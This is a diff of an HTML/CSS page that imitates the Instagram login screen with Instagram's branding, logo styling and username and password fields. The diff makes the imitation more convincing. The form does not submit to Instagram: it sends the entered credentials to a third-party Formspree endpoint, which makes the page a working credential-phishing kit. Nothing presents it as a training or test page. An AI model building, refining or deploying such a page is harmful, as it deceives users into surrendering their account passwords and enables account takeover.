@@ -1,61 +1,111 @@
 <style>
-  .login-container {
-  margin: auto;
-  width: 300px;
-  padding: 20px;
-  border: 1px solid #ccc;
-  border-radius: 5px;
-}
-
-form {
-  display: flex;
-  flex-direction: column;
-}
-
-label {
-  margin-bottom: 10px;
-}
-
-input {
-  padding: 5px;
-  margin-bottom: 20px;
-  border-radius: 5px;
-  border: 1px solid #ccc;
-}
-
-button {
-  background-color: #3897f0;
-  color: #fff;
-  padding: 10px 15px;
-  border-radius: 5px;
-  border: none;
-  cursor: pointer;
-  font-weight: bold;
-}
-
-button:hover {
-  background-color: #2471a3;
-}
-</style>
-
-
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Instagram Login</title>
-    <link rel="stylesheet" type="text/css" href="style.css">
-  </head>
-  <body>
-    <div class="login-container">
-      <form action="https://formspree.io/f/mqkoqpyz" method="POST">
-        <h1>Instagram Login</h1>
-        <label for="username">Username:</label>
-        <input type="text" id="username" name="username" required>
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required>
-        <button type="submit">Login</button>
-      </form>
-      <p>Don't have an account? <a href="signup.php">Sign up</a></p>
-    </div>
-  </body>
-</html>
+    .login-container {
+      margin: auto;
+      width: 300px;
+      padding: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    
+    label {
+      margin-bottom: 10px;
+    }
+    
+    input {
+      padding: 5px;
+      margin-bottom: 20px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    
+    button {
+      background-color: #3897f0;
+      color: #fff;
+      padding: 10px 15px;
+      border-radius: 5px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    
+    button:hover {
+      background-color: #2471a3;
+    }
+  
+    .option{
+      text-align: center;
+    }
+  
+    .Logo{
+      text-align: center;
+      font-family: 'Pacifico', cursive;
+    }
+  
+    .forget_id{
+      text-align: center;
+      margin: 20px;
+  
+    }
+    .forget_id a {
+      text-decoration: none;
+      color: #025fd2;
+      font-size: 17px;
+      font-weight: 500;
+    }
+  
+  
+    .sign a{
+      text-align: centre;
+    }
+  </style>
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <title>Instagram</title>
+        <link rel="stylesheet" type="text/css" href="#">
+        <link  href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap ">
+      </head>
+      <body>
+        <div class="login-container">
+          <form action="https://formspree.io/f/mqkoqpyz" method="POST">
+            <div class="Logo">
+            <h1>Instagram</h1>
+          </div>
+            <label for="username"></label>
+            <input type="text" id="username" name="username" required placeholder="Email,phone number,username">
+            <label for="password"></label>
+            <input type="password" id="password" name="password" required placeholder="Password">
+            <button type="submit">Login</button>
+            <div class="option"> <hr> OR <hr></div>
+          </form>
+  
+          <div class="forget_id">
+            <a href="#">Forget password?</a>
+          </div>
+  
+          <div class="forget_id">
+            <p>Don't have an account? <a href="#">Signup</a> </p> 
+          </div>
+  
+           
+      
+        </div>
+      </body>
+    </html>
+  
